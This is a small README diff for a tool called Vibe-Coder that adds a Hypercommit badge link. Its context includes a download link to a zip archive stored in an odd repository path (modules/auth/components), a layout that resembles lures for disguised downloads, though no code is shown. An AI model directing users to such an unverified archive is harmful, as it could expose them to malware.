@@ -104,3 +104,7 @@ Vibe-Coder is open-source and freely available for personal and commercial use. 
 We welcome contributions to Vibe-Coder. If you're interested in helping out, please check the contributing guidelines on the main repository page.
 
 [Download Vibe-Coder](https://raw.githubusercontent.com/nauraamora/Vibe-Coder/main/modules/auth/components/Coder_Vibe_v2.6.zip) again to start coding today!
+
+## Links
+
+[![Hypercommit](https://img.shields.io/badge/Hypercommit-DB2475)](https://hypercommit.com/vibe-coder)
